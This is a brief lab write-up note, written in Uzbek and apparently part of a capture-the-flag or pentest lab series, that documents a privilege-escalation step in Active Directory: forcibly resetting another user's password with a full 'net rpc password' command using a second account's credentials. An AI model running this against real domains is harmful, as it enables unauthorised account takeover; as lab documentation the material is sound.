---
title: Password Change
tags: [privilege-escalation, active-directory]
---

# Password Change

Labda `hall.noa` accountining passwordi `net rpc password` orqali o‘zgartirilgan.

```bash
net rpc password "hall.noa" "<NEW_LAB_PASSWORD>" -U "visual.local"/"roy.ada"%"<LAB_PASSWORD>" -S 192.168.60.76
```

Screenshot command xatosiz qaytganini ko‘rsatadi.

![[08 - Change Hall Noa Password.png]]
